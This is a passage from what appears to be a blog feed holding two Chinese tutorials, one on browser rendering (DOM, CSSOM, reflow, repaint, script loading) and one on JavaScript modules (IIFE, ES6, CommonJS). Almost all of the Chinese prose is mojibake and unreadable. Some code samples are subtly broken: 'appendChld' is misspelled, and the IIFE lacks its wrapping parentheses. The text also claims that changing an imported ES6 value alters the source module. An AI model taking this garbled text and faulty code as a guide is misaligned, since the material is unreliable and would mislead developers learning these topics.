éœ€è¦åœ¨å±å¹•ä¸Šé‡æ–°æ¸²æŸ“ã€‚å®é™…ä¸Šï¼ŒCSSä¸javascriptå¾€å¾€ä¼šå¤šæ¬¡ä¿®æ”¹DOMå’ŒCSSDOMã€‚</p><p><br></p><h4 id="4-1-DOMæ ‘"><a href="#4-1-DOMæ ‘" class="headerlink" title="4.1 DOMæ ‘"></a>4.1 DOMæ ‘</h4><p>å‡è®¾æ‹¿åˆ°äº†è¿™æ ·çš„é¡µé¢ï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,initial-scale=1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"style.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Critical Path<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">span</span>&gt;</span>web performance<span class="tag">&lt;/<span class="name">span</span>&gt;</span> students!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"awesome-photo.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>è§£æHTMLï¼Œæ„å»ºå‡ºDOMçš„è¿‡ç¨‹å¯ä»¥ç®€è¿°å¦‚ä¸‹ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes â†’ characters â†’ tokens â†’ nodes â†’ DOM</span><br></pre></td></tr></table></figure></p><p><em>è½¬æ¢</em>ï¼šæµè§ˆå™¨å…ˆå°†è·å¾—çš„HTMLå†…å®¹(Bytes)åŸºäºæŒ‡å®šçš„ç¼–ç è½¬æ¢ä¸ºå•ä¸ªå­—ç¬¦ã€‚<br><em>åˆ†è¯</em>ï¼šæŒ‰ç…§HTMLè§„èŒƒå°†è¿™äº›å­—ç¬¦è½¬æ¢ä¸ºä¸åŒçš„æ ‡è®°tokenã€‚æ¯ä¸ªtokenéƒ½æœ‰è‡ªå·±ç‹¬ç‰¹çš„å«ä¹‰ä»¥åŠè§„åˆ™é›†ã€‚<br><em>è¯æ³•åˆ†æ</em>ï¼šåˆ†è¯çš„ç»“æœæ˜¯å¾—åˆ°ä¸€å †çš„tokenï¼Œæ­¤æ—¶æŠŠä»–ä»¬è½¬æ¢ä¸ºå¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡åˆ†åˆ«æœ‰å®ƒä»¬å¯¹åº”çš„å±æ€§å’Œè§„åˆ™<br><em>DOMæ„å»º</em>ï¼šæ ¹æ®æ ‡ç­¾ä¹‹é—´çš„è´µæºªï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªæ ‘å½¢ç»“æ„çš„DOMæ ‘ã€‚</p><p><img src="/2019/06/13/æµè§ˆå™¨/4.png"></p><p><br></p><h4 id="4-2-CSSè§„åˆ™æ ‘"><a href="#4-2-CSSè§„åˆ™æ ‘" class="headerlink" title="4.2 CSSè§„åˆ™æ ‘"></a>4.2 CSSè§„åˆ™æ ‘</h4><p>CSSè§„åˆ™æ ‘çš„ç”Ÿæˆä¹Ÿæ˜¯ç±»ä¼¼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes -&gt; characters -&gt; tokens -&gt; nodes -&gt; CSSDOM</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-3-Renderæ ‘"><a href="#4-3-Renderæ ‘" class="headerlink" title="4.3 Renderæ ‘"></a>4.3 Renderæ ‘</h4><p>å½“DOMæ ‘å’ŒCSSDOMæ ‘éƒ½æœ‰äº†åï¼Œå°±è¦æ„å»ºæ¸²æŸ“æ ‘äº†ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ¸²æŸ“æ ‘å’ŒDOMæ ‘ç›¸å¯¹åº”ï¼Œä½†ä¸æ˜¯ä¸¥æ ¼æ„ä¹‰ä¸Šçš„ä¸€ä¸€å¯¹åº”ï¼Œå› ä¸ºæœ‰ä¸€äº›ä¸å¯è§çš„DOMå…ƒç´ ä¸ä¼šæ’å…¥åˆ°æ¸²æŸ“æ ‘ä¸­ã€‚å¦‚<code>displayï¼šnone</code>çš„å…ƒç´ ï¼Œå’Œ<code>&lt;head&gt;</code>è¿™æ ·çš„ä¸å¯è§æ ‡ç­¾ã€‚<br><br><br><img src="/2019/06/13/æµè§ˆå™¨/5.png"></p><p><br><br><br></p><h4 id="4-4-æ¸²æŸ“"><a href="#4-4-æ¸²æŸ“" class="headerlink" title="4.4 æ¸²æŸ“"></a>4.4 æ¸²æŸ“</h4><p>æœ‰äº†renderæ ‘ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ¸²æŸ“ï¼Œä¸»è¦æœ‰4ä¸ªæ­¥éª¤:</p><ul><li>è®¡ç®—CSSæ ·å¼</li><li>æ„å»ºæ¸²æŸ“æ ‘</li><li>å¸ƒå±€ï¼Œä¸»è¦å®šä½åæ ‡çš„å¤§å°ï¼Œæ˜¯å¦æ¢è¡Œï¼Œå„ç§position overflow z-indexå±æ€§</li><li>ç»˜åˆ¶ï¼Œå°†å›¾åƒç»˜åˆ¶å‡ºæ¥<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Render Tree -&gt; Compute style -&gt; construct frames -&gt; layout -&gt; paint</span><br></pre></td></tr></table></figure></li></ul><p>jsåŠ¨æ€ä¿®æ”¹domæˆ–cssï¼Œä¼šå¯¼è‡´é‡æ–°å¸ƒå±€(Layout)æˆ–æ¸²æŸ“(Repaint)ã€‚</p><p><br></p><h5 id="4-4-1-å›æµ"><a href="#4-4-1-å›æµ" class="headerlink" title="4.4.1 å›æµ"></a>4.4.1 å›æµ</h5><p>Layoutï¼Œä¹Ÿç§°ä¸ºReflow, å›æµã€‚æ„å‘³ç€å…ƒç´ çš„å†…å®¹ã€ç»“æ„ã€ä½ç½®æˆ–å°ºå¯¸å‘ç”Ÿäº†å˜åŒ–ï¼Œéœ€è¦é‡æ–°è®¡ç®—æ ·å¼å’Œæ¸²æŸ“æ ‘ã€‚</p><ul><li>é¡µé¢æ¸²æŸ“åˆå§‹åŒ–</li><li>DOMç»“æ„æ”¹å˜ï¼Œå¦‚åˆ é™¤äº†æŸä¸ªå‡ ç‚¹</li><li>renderæ ‘å˜åŒ–ï¼Œå¦‚å‡å°‘äº†padding</li><li>çª—å£resize</li><li>è·å–æŸäº›å±æ€§ä¹Ÿä¼šè§¦å‘å›æµï¼šoffset(Top/Left/Width/Height), scroll(Top/Left/Width/Height), client(Top/Left/Width/Height), width, height, è°ƒç”¨getComputedStyle</li></ul><p><br></p><h5 id="4-4-2-é‡ç»˜"><a href="#4-4-2-é‡ç»˜" class="headerlink" title="4.4.2 é‡ç»˜"></a>4.4.2 é‡ç»˜</h5><p>Repaintï¼Œå³é‡ç»˜ã€‚æ„å‘³ç€åªæœ‰ä¸€äº›å¤–è§‚å±æ€§å‘ç”Ÿäº†å˜åŒ–ï¼ˆä¾‹å¦‚ï¼ŒèƒŒæ™¯è‰²ï¼Œè¾¹æ¡†é¢œè‰²ï¼Œæ–‡å­—é¢œè‰²ï¼‰ï¼Œæ­¤æ—¶åªéœ€è¦åº”ç”¨æ–°æ ·å¼ç»˜åˆ¶è¿™ä¸ªå…ƒç´ å°±å¯ä»¥äº†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">document</span>.body.style;</span><br><span class="line">s.padding = <span class="string">"2px"</span>;            <span class="comment">// å›æµ+ é‡ç»˜</span></span><br><span class="line">s.border = <span class="string">"1px solid red"</span>;   <span class="comment">// å†ä¸€æ¬¡ å›æµ+é‡ç»˜</span></span><br><span class="line">s.color = <span class="string">"blue"</span>;             <span class="comment">// å†ä¸€æ¬¡ é‡ç»˜</span></span><br><span class="line">s.backgroundColor = <span class="string">"#ccc"</span>;   <span class="comment">// å†ä¸€æ¬¡ é‡ç»˜</span></span><br><span class="line">s.fontSize = <span class="string">"14px"</span>;          <span class="comment">// å†ä¸€æ¬¡ å›æµ+é‡ç»˜</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChld(<span class="built_in">document</span>.createTextNode(<span class="string">'abc!'</span>));  <span class="comment">// å†ä¸€æ¬¡ å›æµ+é‡ç»˜</span></span><br></pre></td></tr></table></figure><p><br></p><h5 id="4-4-3-é¿å…å›æµ"><a href="#4-4-3-é¿å…å›æµ" class="headerlink" title="4.4.3 é¿å…å›æµ"></a>4.4.3 é¿å…å›æµ</h5><p>å›æµçš„æˆæœ¬å¼€é”€è¦é«˜äºé‡ç»˜ï¼Œä¸€ä¸ªèŠ‚ç‚¹çš„å›æµå¾€å¾€å¯¼è‡´å­èŠ‚ç‚¹ä»¥åŠåŒçº§èŠ‚ç‚¹çš„å›æµï¼Œå°½é‡é¿å…å›æµä¸€èˆ¬æœ‰è¿™äº›ä¼˜åŒ–æ–¹æ¡ˆï¼š</p><ul><li>å‡å°‘é€é¡¹æ›´æ”¹æ ·å¼ï¼Œä¸€æ¬¡æ€§ä¿®æ”¹styleï¼Œæˆ–å°†æ ·å¼å·²å®šä¹‰ä¸ºclassä¸€æ¬¡æ€§æ›´æ–°</li><li>é¿å…å¾ªç¯æ“ä½œdomï¼Œåˆ›å»ºä¸€ä¸ªdocumentFragmentæˆ–div,åœ¨ä¸Šé¢åº”ç”¨æ‰€æœ‰domåï¼Œå†æ·»åŠ åˆ°window.document</li><li>é¿å…å¤šæ¬¡è¯»å–offsetå±æ€§ï¼Œç¼“å­˜åˆ°å˜é‡</li><li>å¤æ‚çš„å…ƒç´ ç”¨ç»å¯¹å®šä½æˆ–å›ºå®šå®šä½ï¼Œä½¿å¾—å®ƒè„±ç¦»æ–‡æ¡£æµï¼Œå¦åˆ™å›æµä»£ä»·ä¼šå¾ˆé«˜</li></ul><p><br></p><h4 id="4-5-èµ„æºå¤–é“¾ä¸‹è½½"><a href="#4-5-èµ„æºå¤–é“¾ä¸‹è½½" class="headerlink" title="4.5 èµ„æºå¤–é“¾ä¸‹è½½"></a>4.5 èµ„æºå¤–é“¾ä¸‹è½½</h4><p>å½“htmlè§£æå™¨è¢«è„šæœ¬é˜»å¡æ—¶ï¼Œè§£æå™¨è™½ç„¶ä¼šåœæ­¢æ„å»ºDOMï¼Œä½†ä»ä¼šè¯†åˆ«è¯¥è„šæœ¬åé¢çš„èµ„æºï¼Œå¹¶è¿›è¡Œé¢„åŠ è½½ã€‚å®ƒä»¬åŒ…æ‹¬CSSæ ·å¼èµ„æºï¼ŒJSè„šæœ¬èµ„æºï¼Œimgå›¾ç‰‡èµ„æºã€‚é‡åˆ°è¿™äº›å¤–é“¾æ—¶ï¼Œä¼šå•ç‹¬å¼€å¯ä¸€ä¸ªä¸‹è½½çº¿ç¨‹å»ä¸‹è½½èµ„æºã€‚</p><p><em>cssæ ·å¼èµ„æº</em></p><ul><li>cssä¸‹è½½æ—¶å¼‚æ­¥ï¼Œä¸ä¼šé˜»å¡æµè§ˆå™¨æ„å»ºdomæ ‘</li><li>cssè¢«è§†ä¸ºé˜»å¡æ¸²æŸ“çš„èµ„æºï¼Œæµè§ˆå™¨å°†ä¸ä¼šæ¸²æŸ“ä»»ä½•å·²å¤„ç†çš„å†…å®¹ï¼ŒçŸ¥é“CSSDOMæ„å»ºå®Œæ¯•</li><li>media queryå£°æ˜çš„cssä¸ä¼šé˜»å¡æ¸²æŸ“ï¼Œä¼šåœ¨ç¬¦åˆæ¡ä»¶æ—¶é˜»å¡æ¸²æŸ“</li></ul><p><em>jsè„šæœ¬èµ„æº</em></p><ul><li>å½“æµè§ˆå™¨é‡åˆ°ä¸€ä¸ªscriptæ ‡ç­¾æ—¶ï¼ŒDOMæ„å»ºå°†æš‚åœï¼Œç›´è‡³è„šæœ¬å®Œæˆæ‰§è¡Œ</li><li>åœ¨è„šæœ¬é˜»å¡æ—¶ï¼Œä¹Ÿä¼šç»§ç»­ä¸‹è½½å…¶ä»–èµ„æºï¼Œä½†è§£æè¿‡ç¨‹ä»ç„¶æ˜¯é˜»å¡çš„</li><li>defer: å»¶è¿Ÿæ‰§è¡Œå¼•å…¥çš„jsï¼Œå³è¿™æ®µjsåŠ è½½æ—¶htmlå¹¶æœªåœæ­¢è§£æï¼Œè¿™ä¸¤ä¸ªè¿‡ç¨‹æ˜¯å¹¶è¡Œçš„ã€‚æ•´ä¸ªdocumentè§£æå®Œæ¯•è€Œä¸”defer-scriptä¹ŸåŠ è½½å®Œæˆä¹‹åï¼Œä¼šæ‰§è¡Œæ‰€æœ‰ç”±defer-scriptåŠ è½½çš„jsä»£ç ï¼Œç„¶åè§¦å‘DOMContentLoadedäº‹ä»¶ã€‚</li><li>async: å¼‚æ­¥æ‰§è¡Œå¼•å…¥çš„jsï¼Œasync-scriptå¯èƒ½åœ¨DOMContentLoadedè§¦å‘ä¹‹å‰æˆ–ä¹‹åæ‰§è¡Œï¼Œä½†ä¸€å®šåœ¨loadè§¦å‘ä¹‹å‰æ‰§è¡Œã€‚å¤šä¸ªasync-scriptçš„æ‰§è¡Œé¡ºåºæ˜¯ä¸ç¡®å®šçš„ã€‚<strong>æ³¨æ„ï¼šå‘documentåŠ¨æ€æ·»åŠ scriptæ ‡ç­¾æ—¶ï¼Œasyncå±æ€§é»˜è®¤æ˜¯true</strong>ã€‚å¦‚æœæƒ³åŒæ­¥æ‰§è¡Œï¼Œéœ€è¦æŠŠasyncå±æ€§äººä¸ºè®¾ç½®ä¸ºfalseã€‚<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app.js"</span> <span class="attr">defer</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app.js"</span> <span class="attr">async</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><em>imgå›¾ç‰‡èµ„æº</em><br>é‡åˆ°å›¾ç‰‡èµ„æºæ—¶ï¼Œç›´æ¥ä¼šå¼‚æ­¥ä¸‹è½½ï¼Œä¸ä¼šé˜»å¡è§£æï¼Œä¸‹è½½å®Œåç›´æ¥ç”¨å›¾ç‰‡æ›¿æ¢åŸæœ‰srcçš„åœ°æ–¹</p><p><br></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5a6547d0f265da3e283a1df7" target="_blank" rel="noopener">ä»æµè§ˆå™¨å¤šè¿›ç¨‹åˆ°JSå•çº¿ç¨‹ï¼ŒJSè¿è¡Œæœºåˆ¶æœ€å…¨é¢çš„ä¸€æ¬¡æ¢³ç†</a></li><li><a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">è¿™ä¸€æ¬¡ï¼Œå½»åº•å¼„æ‡‚ JavaScript æ‰§è¡Œæœºåˆ¶</a></li><li><a href="http://fex.baidu.com/blog/2014/05/what-happen/" target="_blank" rel="noopener">FEX ä»è¾“å…¥ URL åˆ°é¡µé¢åŠ è½½å®Œæˆçš„è¿‡ç¨‹ä¸­éƒ½å‘ç”Ÿäº†ä»€ä¹ˆäº‹æƒ…ï¼Ÿ</a></li><li><a href="https://juejin.im/entry/57ff3cea0e3dd90057e5f25e" target="_blank" rel="noopener">ä¸»æµæµè§ˆå™¨å†…æ ¸ä»‹ç»ï¼ˆå‰ç«¯å¼€å‘å€¼å¾—äº†è§£çš„æµè§ˆå™¨å†…æ ¸å†å²ï¼‰</a></li><li><a href="https://hllvm-group.iteye.com/group/topic/37596" target="_blank" rel="noopener">å„JavaScriptå¼•æ“çš„ç®€ä»‹ï¼ŒåŠç›¸å…³èµ„æ–™/åšå®¢æ”¶é›†å¸–</a></li><li><a href="https://juejin.im/entry/59e1d31f51882578c3411c77" target="_blank" rel="noopener">æµè§ˆå™¨çš„æ¸²æŸ“ï¼šè¿‡ç¨‹ä¸åŸç†</a></li><li><a href="http://www.dailichun.com/2018/03/12/whenyouenteraurl.html" target="_blank" rel="noopener">ä»è¾“å…¥URLåˆ°é¡µé¢åŠ è½½çš„è¿‡ç¨‹ï¼Ÿå¦‚ä½•ç”±ä¸€é“é¢˜å®Œå–„è‡ªå·±çš„å‰ç«¯çŸ¥è¯†ä½“ç³»ï¼</a></li><li><a href="https://juejin.im/entry/59e1d31f51882578c3411c77" target="_blank" rel="noopener">æµè§ˆå™¨çš„æ¸²æŸ“ï¼šè¿‡ç¨‹ä¸åŸç†</a></li><li><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">JavaScript è¿è¡Œæœºåˆ¶è¯¦è§£ï¼šå†è°ˆEvent Loop</a></li><li><a href="https://juejin.im/post/5c41b37de51d45527201a87f" target="_blank" rel="noopener">æˆ‘å°¤å…¶æƒ³ç†æ¸…æ¥šjavaScriptçš„æ‰§è¡Œæœºåˆ¶</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>å‰ç«¯æ¨¡å—åŒ–ï¼šIIFEã€ES6 Moduleã€CommonJS</title>
      <link href="/2019/06/11/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
      <url>/2019/06/11/%E6%A8%A1%E5%9D%97%E5%8C%96/</url>
      <content type="html"><![CDATA[<blockquote><p>å‰ç«¯æ¨¡å—åŒ–æ˜¯æŒ‡å°†ä¸€ä¸ªå¤§å‹çš„å‰ç«¯ç¨‹åºåˆ†è§£ä¸ºå°çš„ã€ç‹¬ç«‹çš„æ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±çš„åŠŸèƒ½å’Œæ¥å£ï¼Œå¯ä»¥è¢«å…¶ä»–æ¨¡å—ä½¿ç”¨ã€‚</p></blockquote><p><br></p><h3 id="1-IIFE-é—­åŒ…"><a href="#1-IIFE-é—­åŒ…" class="headerlink" title="1. IIFE é—­åŒ…"></a>1. IIFE é—­åŒ…</h3><p>å¤æ—©æ—¶æœŸçš„ IIFE æ¨¡å¼ï¼Œé€šè¿‡è‡ªæ‰§è¡Œå‡½æ•°åˆ›å»ºé—­åŒ…ã€‚æ•°æ®æ˜¯ç§æœ‰çš„ï¼Œå¤–éƒ¨åªèƒ½é€šè¿‡æš´éœ²çš„æ–¹æ³•æ“ä½œã€‚é€šè¿‡ä¼ å…¥ä¾èµ–çš„æ–¹å¼æ¥è§£å†³æ¨¡å—é—´å¼•ç”¨çš„é—®é¢˜ã€‚è¿™ç§æ–¹å¼ç¡®å®å¯ä»¥å®ç°æ¨¡å—åŒ–å¼€å‘äº†ï¼Œä½†æ˜¯æ¨¡å—æŒ‚è½½åœ¨windowä¸‹ï¼Œä»£ç é˜…è¯»å›°éš¾ï¼Œæ— æ³•æ”¯æŒå¤§è§„æ¨¡æ¨¡å—åŒ–å¼€å‘ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">global, otherModule</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> data = <span class="number">1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">fetchData</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">handleData</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.myModule = &#123;fetchData, handleData, <span class="attr">otherApi</span>: otherModule.api&#125;</span><br><span class="line">&#125;(<span class="built_in">window</span>, <span class="built_in">window</span>.other_module)</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="2-ES6-çš„-import-export"><a href="#2-ES6-çš„-import-export" class="headerlink" title="2. ES6 çš„ import, export"></a>2. ES6 çš„ import, export</h3><p>åœ¨ ES6 ä¹‹å‰ï¼ŒJavaScript å¹¶æ²¡æœ‰åŸç”Ÿæ”¯æŒæ¨¡å—åŒ–ã€‚</p><p>ES Module æ¨¡å—åŒ–å…è®¸å¼€å‘è€…å°†ä»£ç åˆ†å‰²æˆå°çš„ã€ç‹¬ç«‹çš„æ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±çš„ä½œç”¨åŸŸã€‚å®ƒæ˜¯åŸºäºæ–‡ä»¶çš„ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ¨¡å—ã€‚åœ¨æµè§ˆå™¨ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>&lt;script type=&quot;module&quot;&gt;</code>æ ‡ç­¾æ¥åŠ è½½ ESModule æ¨¡å—ã€‚åœ¨ Node.js ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ import å…³é”®å­—æ¥åŠ è½½ ESModule æ¨¡å—ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- åœ¨æµè§ˆå™¨ä¸­åŠ è½½ESModuleæ¨¡å— --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span> <span class="attr">src</span>=<span class="string">"./module.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨Node.jsä¸­åŠ è½½ESModuleæ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> &#123; name &#125; <span class="keyword">from</span> <span class="string">'./module'</span>;</span><br></pre></td></tr></table></figure><p><br></p><p><em>ç‰¹ç‚¹ï¼š</em></p><ul><li>ES6 Moduleæ˜¯é™æ€çš„ï¼Œä»£ç å‘ç”Ÿåœ¨ç¼–è¯‘æ—¶ï¼Œimport å’Œ export ä¸èƒ½æ”¾åœ¨å—çº§ä½œç”¨åŸŸ(å‡½æ•°)å†…ã€‚</li><li>ES6 Moduleè¾“å‡ºçš„æ˜¯å€¼çš„å¼•ç”¨ï¼Œå¦‚æœä¸€ä¸ªæ¨¡å—ä¿®æ”¹äº†å¦ä¸€ä¸ªæ¨¡å—å¯¼å‡ºçš„å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªä¿®æ”¹ä¼šå½±å“åˆ°åŸå§‹æ¨¡å—ã€‚ä»£ç æ˜¯åœ¨æ¨¡å—ä½œç”¨åŸŸä¸­è¿è¡Œï¼Œè€Œä¸æ˜¯åœ¨å…¨å±€ä½œç”¨åŸŸè¿è¡Œã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> name = <span class="string">'å¼ ä¸‰'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; name, sayHello &#125; <span class="keyword">from</span> <span class="string">'./module'</span>;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><p><em>å½±å“ï¼š</em><br>JSæ¨¡å—åŠ è½½ã€åŒ…ä¾èµ–è‡ªåŠ¨å¤„ç†ã€JSè‡ªåŠ¨ç¼–è¯‘ï¼ŒWebåº”ç”¨çš„åŠ è½½æ€§èƒ½å°†è·å¾—åˆ’æ—¶ä»£çš„æå‡ã€‚å› ä¸ºES6 Module,å‰ç«¯çš„æ„å»ºéƒ¨ç½²å‘ç”Ÿé©å‘½æ€§çš„å˜åŒ–â€”â€”å•ç‹¬çš„æ„å»ºç¯èŠ‚å°†é€æ¸å¼±åŒ–ä¹ƒè‡³æ¶ˆå¤±ï¼Œæ„å»ºæ‰€åŒ…å«çš„å®è´¨æ€§å†…å®¹å³è„šæœ¬ã€æ ·å¼ç­‰èµ„æºçš„ç¼–è¯‘è½¬è¯‘ç­‰å°†å®æ—¶åŒ–ã€‚Viteå´›èµ·ï¼ŒGulp/Webpackå°†é€€å‡ºä¸»æµã€‚</p><p><br><br><br></p><h3 id="2-CommonJSï¼ˆrequire-exportsï¼‰"><a href="#2-CommonJSï¼ˆrequire-exportsï¼‰" class="headerlink" title="2. CommonJSï¼ˆrequire/exportsï¼‰"></a>2. CommonJSï¼ˆrequire/exportsï¼‰</h3><p>CommonJS æ˜¯ NodeJS çš„é»˜è®¤æ¨¡å—åŒ–è§„èŒƒã€‚åœ¨ CommonJS è§„èŒƒä¸­ï¼Œæ¨¡å—çš„åŠ è½½æ–¹å¼æ˜¯åŒæ­¥çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä¸€ä¸ªæ¨¡å—è¢«å¼•å…¥æ—¶ï¼Œä¼šç«‹å³æ‰§è¡Œè¯¥æ¨¡å—å†…éƒ¨çš„ä»£ç ï¼Œå¹¶å°†è¯¥æ¨¡å—å¯¼å‡ºçš„å†…å®¹è¿”å›ç»™å¼•å…¥è¯¥æ¨¡å—çš„ä»£ç ã€‚</p><p>æ¨¡å—å¯ä»¥å¤šæ¬¡åŠ è½½ï¼Œç¬¬ä¸€æ¬¡åŠ è½½æ—¶ä¼šè¿è¡Œæ¨¡å—ï¼Œæ¨¡å—è¾“å‡ºç»“æœä¼šè¢«ç¼“å­˜ï¼Œå†æ¬¡åŠ è½½æ—¶ï¼Œä¼šä»ç¼“å­˜ç»“æœä¸­ç›´æ¥è¯»å–æ¨¡å—è¾“å‡ºç»“æœã€‚æ¨¡å—åŠ è½½çš„é¡ºåºï¼ŒæŒ‰ç…§å…¶åœ¨ä»£ç ä¸­å‡ºç°çš„é¡ºåºã€‚</p><ul><li><p>å®šä¹‰æ¨¡å—</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> basicNum = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  add: add,</span><br><span class="line">  basicNum: basicNum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¼•ç”¨æ¨¡å—</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¼•ç”¨è‡ªå®šä¹‰æ¨¡å—ï¼Œå‚æ•°ä¸ºæ–‡ä»¶è·¯å¾„ï¼Œå¯çœç•¥.js</span></span><br><span class="line"><span class="keyword">var</span> math = <span class="built_in">require</span>(<span class="string">'./math'</span>);</span><br><span class="line">math.add(<span class="number">2</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 